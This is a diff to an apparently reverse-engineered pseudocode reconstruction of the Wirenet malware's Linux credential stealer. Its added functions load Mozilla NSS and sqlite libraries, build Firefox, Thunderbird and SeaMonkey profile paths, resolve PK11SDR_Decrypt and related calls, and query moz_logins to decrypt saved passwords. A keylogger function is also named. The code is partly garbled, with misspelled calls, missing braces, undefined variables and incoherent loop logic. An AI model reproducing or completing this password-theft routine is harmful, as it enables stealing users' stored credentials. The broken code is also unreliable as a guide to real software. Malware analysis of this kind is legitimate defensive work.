@@ -847,10 +847,37 @@ BOOL IsX11LibAPILoaded (Display &monitor) {
 
 	cpGetProcAddress (&handle, "XQuery tree");
 
-	. . .
+	...
 	// T
 }
 
+
+uint8_t __attribute__((cdecl)) LoadMozillaLibs (...) {
+
+  // Linux path to API Lib
+  char * path = "/usr/lib";
+
+  FindFile("/usr/lib", "firefox-3*", ..., ..., ...);
+  FindFile("/usr/lib", "firefox-4*", ..., ..., ...);
+  FindFile("/usr/lib", "thunderbird-*", ..., ..., ...);
+
+  while ( 1 ) {
+    FindMozillaLib (&name, ...);	// return a file path
+
+    if ( cpFileExists(&name) ) {	// if it exists
+      	FindMozillaLib(&name, "libmozsqlite3.so", ...);	// open it
+	}
+
+    if ( !(cpFileExists(&name)) ) 
+      	return -1;
+
+    success = cpLoadLibrary(&name);
+
+    if ( success )
+      	return 0;
+	else
+		return -1;
+}
 
 
 // 
@@ -989,60 +1016,100 @@ int32_t  __attribute__((cdecl)) cpStartKeylogger () {
 
 }
 
-
+// arg_0 is used to choose which Mozilla product 'Wirenet' steals from
 int32_t  __attribute__((cdecl)) GetMozillaProductPasswords (int32_t arg_0) {
 
 	char * homepath;
 	char * profile_file_name;
+	char * init;
+	void * libhandle;
 
+	// Attack seamonkey
 	if (arg_0 == 6) {
 
-		if ( LoadMozillaLib() ) 
-			return -1;
-		
+		// If MozillaLibs not loaded
+		if (  MozillaLibs... ) 
+			handle = LoadMozillaLib();
 
 		// Get the environment variable path
 		homepath = getenv("HOME");
 
 		// Initialize a string
-		__snprintf_chk(&v39, 4352, 1, 4352, "%s/.mozilla/seamonkey/profiles.ini", homepath);
+		__snprintf_chk(&init_string, ..., ..., ..., "%s/.mozilla/seamonkey/profiles.ini", homepath);
 
 		// Parses the profiles.ini file and extract the file name
-		if ( ExtractProfileName((int)&v39, &v43, 64) ) {
-
+		if ( ExtractProfileName(&init_string, profile_name, ...) ) {
+			__snprintf_chk(&init_string, ..., ..., ..., "%s/.mozilla/seamonkey/%s", v7, &v43);
 		}
 
-	 	goto LABEL_13;
+	 	goto SUCCESS;
 	}
 
+	// Attack thunderbird
 	if (arg_0 == 2) {
 
-		__snprintf_chk(&v39, 4352, 1, 4352, "%s/.thunderbird/profiles.ini", v4)
+		__snprintf_chk(&init_string, ..., ..., ..., "%s/.thunderbird/profiles.ini", homepath)
 
 		// Once again, the steps executed above are the same, just for thunderbird
-		if ( ExtractProfileName((int)&v39, &v43, 64) ) {
-			__snprintf_chk(&v39, 4352, 1, 4352, "%s/.thunderbird/%s", v5, &v43);
+		if ( ExtractProfileName(&init_string, profile_name, ...) ) {
+			__snprintf_chk(&init_string, ..., ..., ..., "%s/.thunderbird/%s", v5, &v43);
 		}
+
+	 	goto SUCCESS;
 	}
 
+	// Attack firefox
 	if (arg_0 == 1) {
 		
-		__snprintf_chk(&v39, 4352, 1, 4352, "%s/.mozilla/firefox/profiles.ini", homepath);
+		__snprintf_chk(&init_string, ..., ..., ..., "%s/.mozilla/firefox/profiles.ini", homepath);
 
-		if ( ExtractProfileName((int)&v39, &v43, 64) ) {
-			__snprintf_chk(&v39, 4352, 1, 4352, "%s/.mozilla/firefox/%s", v3, &v43);
+		if ( ExtractProfileName (&init_string, profile_name, ...) ) {
+			__snprintf_chk(&init_string, ..., ..., ..., "%s/.mozilla/firefox/%s", v3, &v43);
 		}
 
+	 	goto SUCCESS;
 	}
 
 
-LABEL_13:
+FAILURE:
 
 	CleanUpMozilla ();
 	return ;
 
-LABEL_44:
+SUCCESS:
 	
 	// Do the actual thing
+	// Once the library is loaded into memory, there are some other things that
+	// have to be done in before beign able to use the library functions
+
+	cpGetProcAddress (handle , "NSS_Init");
+	cpGetProcAddress (handle , "PK11_GetInternalKeySlot");
+	cpGetProcAddress (handle , "NSSBase64_DecodeBuffer");
+	cpGetProcAddress (handle , "PK11SDR_Decrypt");
+	cpGetProcAddress (handle , "PK11_FreeSlot");
+	cpGetProcAddress (handle , "NSS_Shutdown");
+	cpGetProcAddress (handle , "sqlite3_open");
+	cpGetProcAddress (handle , "sqlite3_close");
+	cpGetProcAddress (handle , "sqlite3_prepare_v2");
+	cpGetProcAddress (handle , "sqlite3_step");
+	cpGetProcAddress (handle , "sqlite3_columne_text");
+	
+	// Once everything is loaded, we're ready to 
+	sqlite3_prepare_v2 ("select *  from moz_logins");
+
+	// SECStatus 	NSS_Init (const char *configdir)
+	NSS_Init (...);
+
+	// PK11_GetInternalKeySlot
+	keySlot = PK11_GetInternalKeySlot();
+
+	// 
+	PK11_Authenticate (keySlot);
+
+	// 
+	sqlite3_column_text ();
+	// 
+
+	// 
 
 }
